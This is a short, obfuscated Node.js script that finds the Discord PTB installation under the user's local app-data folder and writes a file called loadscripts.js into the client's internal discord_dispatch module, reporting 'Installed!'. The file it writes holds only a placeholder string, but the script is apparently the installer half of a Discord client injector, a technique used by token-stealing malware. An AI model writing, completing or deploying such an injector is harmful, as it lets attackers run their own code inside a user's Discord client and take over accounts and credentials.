var fs = require('fs');

var d45197b50ccc = `a`

var a3b80a = fs.readdirSync(process.env.LOCALAPPDATA + "/DiscordPTB/").filter(fn => fn.startsWith('app-'));

fs.writeFile(process.env.LOCALAPPDATA + "/DiscordPTB/" + a3b80a + "/modules/discord_dispatch-1/discord_dispatch" + "/loadscripts.js", d45197b50ccc, function (err) {
  if (err) throw err;
  console.log('Installed!');
});

/*fs.appendFile('', ' This is my text.', function (err) {
  if (err) throw err;
  console.log('Updated!');
});*/
